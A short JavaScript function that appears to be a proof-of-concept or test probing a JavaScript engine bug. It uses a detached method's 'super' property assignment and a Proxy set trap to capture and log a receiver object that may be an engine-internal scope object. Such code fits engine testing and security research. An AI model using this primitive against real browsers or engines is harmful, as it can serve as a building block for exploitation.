function leakScope() {
    try {
        let receiver = null;

        class Leaker {
            leak() {
                super.foo = {};
                return receiver;
            }
        }

        Leaker.prototype.__proto__ = new Proxy({}, {
            set(target, property, value, _receiver) {
                receiver = _receiver;
                return true;
            }
        });

        const foo = 42;
        const { leak } = Leaker.prototype;

        let result = (() => leak())();
        log("leakScope() returned receiver: " + result);
        return result;
    } catch (e) {
        log("leakScope() threw: " + e);
        return null;
    }
}
